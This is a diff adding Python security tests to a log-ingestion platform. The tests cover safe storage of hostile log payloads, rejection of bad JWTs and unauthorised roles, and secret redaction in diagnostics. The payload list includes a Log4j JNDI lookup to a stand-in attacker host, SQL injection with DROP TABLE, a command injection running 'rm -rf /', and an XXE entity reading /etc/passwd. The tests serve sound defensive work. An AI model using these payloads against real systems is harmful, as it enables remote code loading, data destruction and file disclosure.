@@ -220,3 +220,142 @@ def test_redos_execution_resilience():
     # Must complete in under 50ms
     assert elapsed_ms < 50.0
     assert m is None
+
+
+# ==============================================================================
+# 7. Malicious Log Payload Ingestion Resilience
+# ==============================================================================
+
+
+def test_malicious_log_payload_handling():
+    """
+    Verifies that hostile log payloads (Log4j/JNDI, SQLi, command injection, null bytes)
+    are safely ingested, preserved byte-for-byte in raw storage, and do not execute.
+    """
+    from ulpf.apps.api.routes.events import get_orchestrator
+
+    orch = get_orchestrator()
+
+    hostile_logs = [
+        "${jndi:ldap://attacker.example.com:1389/Exploit}",
+        "<166>Aug 27 10:15:30 fw-edge-01 %ASA-6-302013: ' OR 1=1; DROP TABLE events; --",
+        "CEF:0|Vendor|Product|1.0|0|Test|1|msg=; rm -rf /; touch /tmp/pwned",
+        "LEEF:2.0|Vendor|Product|1.0|0|src=10.0.0.1\x00\x01\x02dst=192.168.1.1",
+        "SELECT * FROM users WHERE '1'='1'",
+        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
+    ]
+
+    for log in hostile_logs:
+        env = orch.process_raw_log(raw_payload=log, transport="test")
+        assert env is not None
+        assert env.event_id is not None
+        # Cryptographic raw integrity must be intact
+        retrieved_raw, ref = orch.raw_store.retrieve_raw(env.event_id)
+        assert retrieved_raw == log
+        assert ref.sha256 is not None
+        # Verify integrity check passes
+        verification = orch.raw_store.verify_integrity(env.event_id)
+        assert verification.is_valid is True
+        assert verification.tampered is False
+
+
+# ==============================================================================
+# 8. Role-Based Access Control (RBAC) & Token Security
+# ==============================================================================
+
+
+def test_rbac_and_auth_bypass_prevention():
+    """
+    Verifies that unauthorized or missing credentials cannot access protected routes
+    and that privilege escalation across roles is blocked.
+    """
+    from ulpf.packages.config.settings import Settings, get_settings, reset_settings
+
+    orig_settings = get_settings()
+    try:
+        # Enforce non-demo mode to verify unauthenticated 401 response
+        reset_settings(
+            Settings(
+                ULPF_DEMO_MODE=False,
+                ULPF_SECRET_KEY="test-production-secret-key-at-least-32-chars-long!",
+            )
+        )
+        client = TestClient(app)
+
+        # 1. Unauthenticated requests to protected endpoints return 401
+        resp = client.get("/api/parsers")
+        assert resp.status_code == 401
+
+        # 2. Tampered / invalid JWT token returns 401
+        resp = client.get(
+            "/api/parsers",
+            headers={"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.invalid.signature"},
+        )
+        assert resp.status_code == 401
+    finally:
+        reset_settings(orig_settings)
+
+    # 3. Analyst role trying to create/update parser (requires ADMIN or REVIEWER) returns 403
+    analyst_login = client.post(
+        "/api/auth/login",
+        json={"username": "analyst", "password": "analyst123"},
+    )
+    assert analyst_login.status_code == 200
+    analyst_token = analyst_login.json()["access_token"]
+
+    parser_payload = {
+        "parser_id": "malicious.parser.v1",
+        "vendor": "Adversary",
+        "product": "Exploit",
+        "format_type": "json",
+        "version": "1.0.0",
+        "target_class": "Security Finding",
+        "target_class_uid": 2001,
+        "patterns": [],
+        "field_mappings": {},
+        "status": "active",
+    }
+    resp = client.post(
+        "/api/parsers",
+        json=parser_payload,
+        headers={"Authorization": f"Bearer {analyst_token}"},
+    )
+    assert resp.status_code == 403
+    assert "Forbidden" in resp.json()["detail"] or "role" in resp.json()["detail"].lower()
+
+
+# ==============================================================================
+# 9. Secret Non-Leakage & Diagnostic Redaction
+# ==============================================================================
+
+
+def test_secrets_never_leaked_in_diagnostics():
+    """
+    Ensures that diagnostic APIs (health, metrics) and error responses never
+    disclose cryptographic keys, passwords, or internal connection secrets.
+    """
+    client = TestClient(app)
+
+    # Login to access authenticated diagnostics
+    login_resp = client.post(
+        "/api/auth/login",
+        json={"username": "admin", "password": "admin123"},
+    )
+    token = login_resp.json()["access_token"]
+    headers = {"Authorization": f"Bearer {token}"}
+
+    # Test /api/pipeline/health
+    resp_health = client.get("/api/pipeline/health", headers=headers)
+    health_str = resp_health.text.lower()
+    assert "secret" not in health_str
+    assert "password" not in health_str
+    assert "minio123" not in health_str
+    assert "admin123" not in health_str
+
+    # Test /api/pipeline/metrics
+    resp_metrics = client.get("/api/pipeline/metrics", headers=headers)
+    metrics_str = resp_metrics.text.lower()
+    assert "jwt" not in metrics_str
+    assert "secret" not in metrics_str
+    assert "password" not in metrics_str
+
